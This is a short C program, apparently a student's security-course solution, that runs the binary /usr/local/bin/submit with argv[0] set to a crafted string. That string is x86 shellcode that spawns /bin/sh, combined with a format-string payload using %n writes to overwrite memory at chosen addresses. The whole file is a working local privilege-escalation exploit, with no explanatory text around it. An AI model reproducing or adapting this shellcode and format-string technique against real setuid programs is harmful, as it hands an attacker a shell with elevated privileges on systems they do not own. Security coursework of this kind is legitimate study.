//Patrick Wong
//20317267

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define TARGET "/usr/local/bin/submit"

int main(void)
{  
	int i, c;
	char *args[4];
	char *env[1];	

	char shellcode[] = "\x0c\xde\xbf\xff\x0e\xde\xbf\xff\x90\x90\x90\x90\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh%57183x%267$n%08231x%268$n   ";

	args[0] = shellcode;
	args[1] = "-v"; 
	args[2] = NULL; 
	args[3] = NULL;
	env[0] = NULL;
	
	if (execve(TARGET, args, env) < 0)
		fprintf(stderr, "execve failed.\n");
	exit(0);
}
